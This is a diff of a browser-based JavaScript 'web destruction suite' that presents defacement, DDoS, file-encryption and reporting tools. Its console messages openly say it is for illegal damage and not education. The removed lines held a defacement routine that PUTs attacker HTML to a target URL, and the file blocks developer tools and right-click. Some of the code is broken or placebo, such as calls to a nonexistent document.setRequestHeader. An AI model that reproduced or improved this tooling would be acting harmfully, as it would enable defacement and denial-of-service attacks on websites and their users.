@@ -1,77 +1,77 @@
 // +---------------------------------------------------------------------------+
-// | ███╗ ███╗ ██████╗ ███████╗██████╗ ██████╗ █████╗ ██╗ ██╗ |
-// | ████╗ ████║██╔═══██╗██╔════╝██╔══██╗██╔════╝ ██╔══██╗██║ ██║ |
-// | ██╔████╔██║██║ ██║███████╗██████╔╝██║ ███╗███████║██║ ██║ |
-// | ██║╚██╔╝██║██║ ██║╚════██║██╔══██╗██║ ██║██╔══██║██║ ██║ |
-// | ██║ ╚═╝ ██║╚██████╔╝███████║██║ ██║╚██████╔╝██║ ██║███████╗███████╗ |
-// | ╚═╝ ╚═╝ ╚═════╝ ╚══════╝╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═╝╚══════╝╚══════╝ |
-// | NOODLES INC - WEB DESTRUCTION SUITE |
-// | USE AT YOUR OWN RISK. WE ARE NOT RESPONSIBLE FOR YOUR SHIT. FUCK AROUND! |
-// +---------------------------------------------------------------------------+
+ // | ███╗ ███╗ ██████╗ ███████╗██████╗ ██████╗ █████╗ ██╗ ██╗ |
+ // | ████╗ ████║██╔═══██╗██╔════╝██╔══██╗██╔════╝ ██╔══██╗██║ ██║ |
+ // | ██╔████╔██║██║ ██║███████╗██████╔╝██║ ███╗███████║██║ ██║ |
+ // | ██║╚██╔╝██║██║ ██║╚════██║██╔══██╗██║ ██║██╔══██║██║ ██║ |
+ // | ██║ ╚═╝ ██║╚██████╔╝███████║██║ ██║╚██████╔╝██║ ██║███████╗███████╗ |
+ // | ╚═╝ ╚═╝ ╚═════╝ ╚══════╝╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═╝╚══════╝╚══════╝ |
+ // | NOODLES INC - WEB DESTRUCTION SUITE |
+ // | USE AT YOUR OWN RISK. WE ARE NOT RESPONSIBLE FOR YOUR SHIT. FUCK AROUND! |
+ // +---------------------------------------------------------------------------+
 
-// Styles and particles
-const style = document.createElement('style');
-style.innerHTML = `
- body {
+ // Styles and particles
+ const style = document.createElement('style');
+ style.innerHTML = `
+  body {
   background-color: #000;
   color: #00FF00;
   font-family: monospace;
   overflow: hidden;
- }
+  }
 
- #particles-js {
+  #particles-js {
   position: absolute;
   width: 100%;
   height: 100%;
   background-color: #000;
   z-index: -1;
- }
+  }
 
- .container {
+  .container {
   width: 80%;
   margin: 20px auto;
   padding: 20px;
   background-color: rgba(0, 0, 0, 0.8);
   border: 1px solid #00FF00;
   box-shadow: 0 0 10px #00FF00;
- }
+  }
 
- h1, h2, h3 {
+  h1, h2, h3 {
   color: #00FF00;
   text-shadow: 0 0 5px #00FF00;
   margin-bottom: 20px;
- }
+  }
 
- p {
+  p {
   color: #DDD;
- }
+  }
 
- .tool-section {
+  .tool-section {
   margin-bottom: 30px;
   border: 1px solid #00FF00;
   padding: 15px;
- }
+  }
 
- .warning {
+  .warning {
   color: #FF0000;
   font-weight: bold;
- }
+  }
 
- button {
+  button {
   background-color: #333;
   color: #00FF00;
   border: 1px solid #00FF00;
   padding: 10px 20px;
   cursor: pointer;
   transition: background-color 0.3s, color 0.3s;
- }
+  }
 
- button:hover {
+  button:hover {
   background-color: #00FF00;
   color: #000;
- }
+  }
 
- input[type="text"], input[type="number"], textarea {
+  input[type="text"], input[type="number"], textarea {
   background-color: #222;
   color: #00FF00;
   border: 1px solid #00FF00;
@@ -79,27 +79,27 @@ style.innerHTML = `
   width: 100%;
   margin-bottom: 10px;
   font-family: monospace;
- }
+  }
 
- /* Additional styles */
- .logo {
+  /* Additional styles */
+  .logo {
   text-align: center;
   margin-bottom: 30px;
- }
+  }
 
- .logo h1 {
+  .logo h1 {
   font-size: 3em;
- }
+  }
 
- .disclaimer {
+  .disclaimer {
   margin-top: 20px;
   color: #FF4500;
   text-align: center;
   font-size: 0.9em;
- }
+  }
 
- /* Side Bar */
- .sidebar {
+  /* Side Bar */
+  .sidebar {
   width: 200px;
   position: fixed;
   top: 0;
@@ -109,39 +109,39 @@ style.innerHTML = `
   border-right: 1px solid #00FF00;
   padding: 20px;
   z-index: 100;
- }
+  }
 
- .sidebar ul {
+  .sidebar ul {
   list-style-type: none;
   padding: 0;
- }
+  }
 
- .sidebar li {
+  .sidebar li {
   margin-bottom: 10px;
- }
+  }
 
- .sidebar a {
+  .sidebar a {
   color: #00FF00;
   text-decoration: none;
   display: block;
   padding: 8px 16px;
   border: 1px solid #00FF00;
   transition: background-color 0.3s, color 0.3s;
- }
+  }
 
- .sidebar a:hover {
+  .sidebar a:hover {
   background-color: #00FF00;
   color: #000;
- }
+  }
 
- /* Main Content Area */
- .main-content {
+  /* Main Content Area */
+  .main-content {
   margin-left: 240px; /* Adjust based on sidebar width + padding */
   padding: 20px;
- }
+  }
 
- /* Scanlines */
- .scanlines {
+  /* Scanlines */
+  .scanlines {
   position: absolute;
   top: 0;
   left: 0;
@@ -150,20 +150,20 @@ style.innerHTML = `
   background: repeating-linear-gradient(0deg, rgba(0,0,0,0), rgba(0,0,0,0.1) 1px, rgba(0,0,0,0.2) 2px);
   z-index: 2;
   pointer-events: none;
- }
-`;
-document.head.appendChild(style);
+  }
+ `;
+ document.head.appendChild(style);
 
-// Scanlines Div
-const scanlines = document.createElement('div');
-scanlines.classList.add('scanlines');
-document.body.appendChild(scanlines);
+ // Scanlines Div
+ const scanlines = document.createElement('div');
+ scanlines.classList.add('scanlines');
+ document.body.appendChild(scanlines);
 
-// Particle setup
-const particlesScript = document.createElement('script');
-particlesScript.src = 'https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js';
-particlesScript.onload = () => {
- particlesJS('particles-js', {
+ // Particle setup
+ const particlesScript = document.createElement('script');
+ particlesScript.src = 'https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js';
+ particlesScript.onload = () => {
+  particlesJS('particles-js', {
   "particles": {
   "number": {
   "value": 80,
@@ -278,31 +278,31 @@ particlesScript.onload = () => {
   "background_repeat": "no-repeat",
   "background_size": "cover"
   }
- });
-};
-document.head.appendChild(particlesScript);
+  });
+ };
+ document.head.appendChild(particlesScript);
 
-// Initial User Consent
-const consent = confirm("ARE YOU FUCKING SURE YOU KNOW WHAT YOU'RE DOING? THIS SHIT IS ILLEGAL AS FUCK. CLICK 'OK' IF YOU'RE READY TO RUMBLE.");
-if (!consent) {
- window.close();
-}
+ // Initial User Consent
+ const consent = confirm("ARE YOU FUCKING SURE YOU KNOW WHAT YOU'RE DOING? THIS SHIT IS ILLEGAL AS FUCK. CLICK 'OK' IF YOU'RE READY TO RUMBLE.");
+ if (!consent) {
+  window.close();
+ }
 
-// Logging Function
-function log(message, color = 'darkgreen') {
- const timestamp = new Date().toISOString();
- const logMessage = `[${timestamp}] ${message}`;
- console.log(`%c${logMessage}`, `color: ${color}; background-color: black;`);
-}
+ // Logging Function
+ function log(message, color = 'darkgreen') {
+  const timestamp = new Date().toISOString();
+  const logMessage = `[${timestamp}] ${message}`;
+  console.log(`%c${logMessage}`, `color: ${color}; background-color: black;`);
+ }
 
-// Check for HTTPS
-if (window.location.protocol !== 'https:') {
- log("%cWARNING: HTTPS is highly recommended for security.", 'color: orange');
-}
+ // Check for HTTPS
+ if (window.location.protocol !== 'https:') {
+  log("%cWARNING: HTTPS is highly recommended for security.", 'color: orange');
+ }
 
-// Security Headers
-function setSecurityHeaders() {
- try {
+ // Security Headers
+ function setSecurityHeaders() {
+  try {
   document.setRequestHeader("X-Frame-Options", "DENY");
   document.setRequestHeader("X-XSS-Protection", "1; mode=block");
   document.setRequestHeader("X-Content-Type-Options", "nosniff");
@@ -310,62 +310,62 @@ function setSecurityHeaders() {
   document.setRequestHeader("Content-Security-Policy", "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:;");
 
   log("%cSecurity Headers set (if server allows).", 'color: darkblue');
- } catch (e) {
+  } catch (e) {
   log("%cFailed to set security headers (Likely due to client-side execution)", 'color: darkblue');
+  }
  }
-}
 
-// Call security headers
-setSecurityHeaders();
+ // Call security headers
+ setSecurityHeaders();
 
-// Disable caching function
-function disableCaching() {
- try {
+ // Disable caching function
+ function disableCaching() {
+  try {
   // Attempt to set headers to prevent caching
   document.setRequestHeader("Cache-Control", "no-cache, no-store, must-revalidate");
   document.setRequestHeader("Pragma", "no-cache");
   document.setRequestHeader("Expires", "0");
 
   log("%cCaching disabled. Good luck, asshole!", 'color: purple');
- } catch (e) {
+  } catch (e) {
   log("%cFailed to disable caching (Likely due to client-side execution)", 'color: purple');
+  }
  }
-}
 
-// Call disableCaching when the script starts
-disableCaching();
+ // Call disableCaching when the script starts
+ disableCaching();
 
-// Prevent Inspect Element from being opened
-document.addEventListener('contextmenu', function(e) {
- e.preventDefault();
-});
-document.addEventListener('keydown', function(e) {
- if (e.keyCode == 123) { // Prevent F12
+ // Prevent Inspect Element from being opened
+ document.addEventListener('contextmenu', function(e) {
   e.preventDefault();
- }
- if (e.ctrlKey && e.shiftKey && e.keyCode == 73) { // Prevent Ctrl+Shift+I
+ });
+ document.addEventListener('keydown', function(e) {
+  if (e.keyCode == 123) { // Prevent F12
   e.preventDefault();
- }
- if (e.ctrlKey && e.shiftKey && e.keyCode == 74) { // Prevent Ctrl+Shift+J
+  }
+  if (e.ctrlKey && e.shiftKey && e.keyCode == 73) { // Prevent Ctrl+Shift+I
   e.preventDefault();
- }
- if (e.ctrlKey && e.keyCode == 85) { // Prevent Ctrl+U
+  }
+  if (e.ctrlKey && e.shiftKey && e.keyCode == 74) { // Prevent Ctrl+Shift+J
   e.preventDefault();
- }
-});
+  }
+  if (e.ctrlKey && e.keyCode == 85) { // Prevent Ctrl+U
+  e.preventDefault();
+  }
+ });
 
-// DOM Elements creation
-document.body.innerHTML = `
- <div id="particles-js"></div>
- <div class="sidebar">
+ // DOM Elements creation
+ document.body.innerHTML = `
+  <div id="particles-js"></div>
+  <div class="sidebar">
   <ul>
   <li><a href="#defacement-tool">Defacement Tool</a></li>
   <li><a href="#ddos-tool">DDoS Tool</a></li>
   <li><a href="#encryption-tool">Encryption Tool</a></li>
   <li><a href="#reporting-feature">Reporting Feature</a></li>
   </ul>
- </div>
- <div class="main-content">
+  </div>
+  <div class="main-content">
   <div class="container">
   <div class="logo">
   <h1>Noodles Inc.</h1>
@@ -377,7 +377,7 @@ document.body.innerHTML = `
   <p>Use this tool to test website security. It allows you to modify any website, even large-scale and .onion sites, for security testing purposes.
   Ensure you have permission before using this tool. Noodles Inc. is not responsible for your actions.</p>
   <div class="warning">WARNING: This tool can cause irreversible damage. Always backup before modifying.</div>
-  <div class="warning">Educational Info: This tool functions by directly manipulating the DOM (Document Object Model) of the target website or by sending PUT requests to modify the site's HTML content.</div>
+  <div class="warning">Educational Info: This tool functions by directly manipulating the DOM (Document Object Model) of the target website.</div>
 
   <label for="defacement-url">Target URL:</label>
   <input type="text" id="defacement-url" placeholder="Enter target URL">
@@ -446,20 +446,20 @@ document.body.innerHTML = `
   Use at your own risk.
   </div>
   </div>
- </div>
-`;
+  </div>
+ `;
 
-// Event listeners and tool implementations
-document.addEventListener('DOMContentLoaded', () => {
- // Defacement Tool Functionality
- const defacementURLInput = document.getElementById('defacement-url');
- const backupSiteButton = document.getElementById('backup-site');
- const defacementCodeTextarea = document.getElementById('defacement-code');
- const previewDefacementButton = document.getElementById('preview-defacement');
- const applyDefacementButton = document.getElementById('apply-defacement');
- const defacementStatus = document.getElementById('defacement-status');
+ // Event listeners and tool implementations
+ document.addEventListener('DOMContentLoaded', () => {
+  // Defacement Tool Functionality
+  const defacementURLInput = document.getElementById('defacement-url');
+  const backupSiteButton = document.getElementById('backup-site');
+  const defacementCodeTextarea = document.getElementById('defacement-code');
+  const previewDefacementButton = document.getElementById('preview-defacement');
+  const applyDefacementButton = document.getElementById('apply-defacement');
+  const defacementStatus = document.getElementById('defacement-status');
 
- backupSiteButton.addEventListener('click', async () => {
+  backupSiteButton.addEventListener('click', async () => {
   const targetURL = defacementURLInput.value;
   log(`Backing up site: ${targetURL}`);
   defacementStatus.textContent = 'Backing up site...';
@@ -487,17 +487,17 @@ document.addEventListener('DOMContentLoaded', () => {
   defacementStatus.textContent = `Error backing up site: ${error.message}`;
   log(`Error backing up site: ${error}`, 'darkred');
   }
- });
+  });
 
- previewDefacementButton.addEventListener('click', () => {
+  previewDefacementButton.addEventListener('click', () => {
   const defacementCode = defacementCodeTextarea.value;
   const previewWindow = window.open('', '_blank');
   previewWindow.document.write(defacementCode);
   log(`Defacement code previewed`);
   defacementStatus.textContent = 'Defacement code previewed.';
- });
+  });
 
- applyDefacementButton.addEventListener('click', () => {
+  applyDefacementButton.addEventListener('click', async () => {
   const targetURL = defacementURLInput.value;
   const defacementCode = defacementCodeTextarea.value;
   log(`Defacing Site with URL: ${targetURL}`);
@@ -509,43 +509,57 @@ document.addEventListener('DOMContentLoaded', () => {
   return;
   }
 
-  fetchWithTimeout(targetURL, {
-  method: 'PUT', // Or PATCH, depending on the server's API
-  mode: 'cors', // Ensure CORS is handled correctly
-  body: defacementCode,
-  headers: {
-  'Content-Type': 'text/html' // Adjust content type as needed
+  try {
+  // Fetch the original site content
+  const response = await fetchWithTimeout(targetURL, {
+  method: 'GET',
+  mode: 'cors'
+  });
+
+  if (!response.ok) {
+  throw new Error(`Failed to fetch original site content: ${response.status} ${response.statusText}`);
   }
-  })
-  .then(response => {
-  if (response.ok) {
-  log(`Site defaced successfully`);
-  defacementStatus.textContent = 'Site defaced successfully!';
+
+  const originalContent = await response.text();
+
+  // Apply the defacement code
+  const defacedContent = originalContent.replace('</body>', `${defacementCode}</body>`);
+
+  // Create a new Blob with the defaced content
+  const defacedBlob = new Blob([defacedContent], { type: 'text/html' });
+
+  // Create a URL for the defaced Blob
+  const defacedURL = URL.createObjectURL(defacedBlob);
+
+  // Open a new window with the defaced content
+  const defaceWindow = window.open(defacedURL, '_blank');
+
+  if (defaceWindow) {
+  log(`Site defaced successfully in a new window.`);
+  defacementStatus.textContent = 'Site defaced successfully in a new window!';
   } else {
-  log(`Error defacing site: ${response.status} ${response.statusText}`, 'darkred');
-  defacementStatus.textContent = `Error defacing site: ${response.status} ${response.statusText}`;
+  throw new Error('Failed to open new window for defacement.');
   }
-  })
-  .catch(error => {
+  } catch (error) {
   log(`Error defacing site: ${error}`, 'darkred');
   defacementStatus.textContent = `Error defacing site: ${error}`;
+  }
   });
- });
 
- // DDoS Tool Functionality
- let ddosInterval;
- let startTime = 0;
- let ddosActive = false;
+  // DDoS Tool Functionality
+  let ddosInterval;
+  let startTime = 0;
+  let ddosActive = false;
 
- const ddosURLInput = document.getElementById('ddos-url');
- const ddosThreadsInput = document.getElementById('ddos-threads');
- const ddosDurationInput = document.getElementById('ddos-duration');
- const startDDoSButton = document.getElementById('start-ddos');
- const stopDDoSButton = document.getElementById('stop-ddos');
- const ddosTimer = document.getElementById('ddos-timer');
- const ddosStatus = document.getElementById('ddos-status');
+  const ddosURLInput = document.getElementById('ddos-url');
+  const ddosThreadsInput = document.getElementById('ddos-threads');
+  const ddosDurationInput = document.getElementById('ddos-duration');
+  const startDDoSButton = document.getElementById('start-ddos');
+  const stopDDoSButton = document.getElementById('stop-ddos');
+  const ddosTimer = document.getElementById('ddos-timer');
+  const ddosStatus = document.getElementById('ddos-status');
 
- const startDDoS = async (targetURL, threads, duration) => {
+  const startDDoS = async (targetURL, threads, duration) => {
   if (ddosActive) {
   log('DDoS already in progress.', 'darkred');
   ddosStatus.textContent = 'DDoS already in progress.';
@@ -585,21 +599,21 @@ document.addEventListener('DOMContentLoaded', () => {
   }
   updateTimer();
   }, 0);
- };
+  };
 
- const stopDDoS = () => {
+  const stopDDoS = () => {
   clearInterval(ddosInterval);
   ddosActive = false;
   log('DDoS attack stopped.');
   ddosStatus.textContent = 'DDoS attack stopped.';
- };
+  };
 
- const updateTimer = () => {
+  const updateTimer = () => {
   const elapsedTime = Math.floor((Date.now() - startTime) / 1000);
   ddosTimer.textContent = `Time Elapsed: ${elapsedTime} seconds`;
- };
+  };
 
- startDDoSButton.addEventListener('click', () => {
+  startDDoSButton.addEventListener('click', () => {
   const targetURL = ddosURLInput.value;
   const threads = parseInt(ddosThreadsInput.value, 10);
   const duration = parseInt(ddosDurationInput.value, 10);
@@ -611,19 +625,19 @@ document.addEventListener('DOMContentLoaded', () => {
   }
 
   startDDoS(targetURL, threads, duration);
- });
+  });
 
- stopDDoSButton.addEventListener('click', stopDDoS);
+  stopDDoSButton.addEventListener('click', stopDDoS);
 
- // Encryption Tool Functionality
- const encryptionFileInput = document.getElementById('encryption-file');
- const encryptionKeyInput = document.getElementById('encryption-key');
- const encryptFileButton = document.getElementById('encrypt-file');
- const decryptFileButton = document.getElementById('decrypt-file');
- const encryptionInstructions = document.getElementById('encryption-instructions');
- const encryptionStatus = document.getElementById('encryption-status');
+  // Encryption Tool Functionality
+  const encryptionFileInput = document.getElementById('encryption-file');
+  const encryptionKeyInput = document.getElementById('encryption-key');
+  const encryptFileButton = document.getElementById('encrypt-file');
+  const decryptFileButton = document.getElementById('decrypt-file');
+  const encryptionInstructions = document.getElementById('encryption-instructions');
+  const encryptionStatus = document.getElementById('encryption-status');
 
- encryptFileButton.addEventListener('click', async () => {
+  encryptFileButton.addEventListener('click', async () => {
   const fileInput = encryptionFileInput;
   const key = encryptionKeyInput.value;
 
@@ -704,9 +718,9 @@ document.addEventListener('DOMContentLoaded', () => {
   };
 
   reader.readAsArrayBuffer(file);
- });
+  });
 
- decryptFileButton.addEventListener('click', async () => {
+  decryptFileButton.addEventListener('click', async () => {
   const fileInput = encryptionFileInput;
   const key = encryptionKeyInput.value;
 
@@ -772,16 +786,16 @@ document.addEventListener('DOMContentLoaded', () => {
   };
 
   reader.readAsArrayBuffer(file);
- });
+  });
 
- // Reporting Feature Functionality
- const reportTitleInput = document.getElementById('report-title');
- const reportDescriptionTextarea = document.getElementById('report-description');
- const generateReportButton = document.getElementById('generate-report');
- const saveReportButton = document.getElementById('save-report');
- const reportingStatus = document.getElementById('reporting-status');
+  // Reporting Feature Functionality
+  const reportTitleInput = document.getElementById('report-title');
+  const reportDescriptionTextarea = document.getElementById('report-description');
+  const generateReportButton = document.getElementById('generate-report');
+  const saveReportButton = document.getElementById('save-report');
+  const reportingStatus = document.getElementById('reporting-status');
 
- generateReportButton.addEventListener('click', () => {
+  generateReportButton.addEventListener('click', () => {
   const reportTitle = reportTitleInput.value;
   const reportDescription = reportDescriptionTextarea.value;
 
@@ -794,9 +808,9 @@ document.addEventListener('DOMContentLoaded', () => {
   log(`Report generated: ${reportTitle}`);
   reportingStatus.textContent = 'Report generated! (Check console for details)';
   console.log(reportContent);
- });
+  });
 
- saveReportButton.addEventListener('click', () => {
+  saveReportButton.addEventListener('click', () => {
   const reportTitle = reportTitleInput.value;
   const reportDescription = reportDescriptionTextarea.value;
 
@@ -817,34 +831,34 @@ document.addEventListener('DOMContentLoaded', () => {
 
   log(`Report "${reportTitle}" saved.`);
   reportingStatus.textContent = `Report "${reportTitle}" saved.`;
+  });
  });
-});
 
-// Timeout Function for Fetch
-async function fetchWithTimeout(resource, options = {}) {
- const { timeout = 10000 } = options; // Default timeout of 10 seconds
- const controller = new AbortController();
- const id = setTimeout(() => controller.abort(), timeout);
+ // Timeout Function for Fetch
+ async function fetchWithTimeout(resource, options = {}) {
+  const { timeout = 10000 } = options; // Default timeout of 10 seconds
+  const controller = new AbortController();
+  const id = setTimeout(() => controller.abort(), timeout);
 
- try {
+  try {
   const response = await fetch(resource, {
   ...options,
   signal: controller.signal
   });
   clearTimeout(id);
   return response;
- } catch (error) {
+  } catch (error) {
   clearTimeout(id);
   console.error("Fetch Error:", error);
   throw error;
+  }
  }
-}
 
-// Educational Information (LOL)
-log("%cTHIS IS NOT EDUCATIONAL. THIS IS FOR FUCKING SHIT UP. YOU'RE A FUCKING IDIOT IF YOU THINK THIS IS FOR LEARNING. USE AT YOUR OWN RISK. IT'S YOUR LIFE. YOU FUCKING MORON.", 'color: orange');
+ // Educational Information (LOL)
+ log("%cTHIS IS NOT EDUCATIONAL. THIS IS FOR FUCKING SHIT UP. YOU'RE A FUCKING IDIOT IF YOU THINK THIS IS FOR LEARNING. USE AT YOUR OWN RISK. IT'S YOUR LIFE. YOU FUCKING MORON.", 'color: orange');
 
-// Disclaimer
-log("%cNoodles Inc. Disclaimer: WE DON'T GIVE A SHIT WHAT YOU DO. WE ARE NOT RESPONSIBLE. YOU ARE ON YOUR OWN. HOPE YOU HAVE A GOOD FUCKING LAWYER.", 'color: red');
+ // Disclaimer
+ log("%cNoodles Inc. Disclaimer: WE DON'T GIVE A SHIT WHAT YOU DO. WE ARE NOT RESPONSIBLE. YOU ARE ON YOUR OWN. HOPE YOU HAVE A GOOD FUCKING LAWYER.", 'color: red');
 
-// Final FUCK YOU before exiting
-log("%cFUCK YOU AND GOODBYE.", 'color: darkred');
+ // Final FUCK YOU before exiting
+ log("%cFUCK YOU AND GOODBYE.", 'color: darkred');
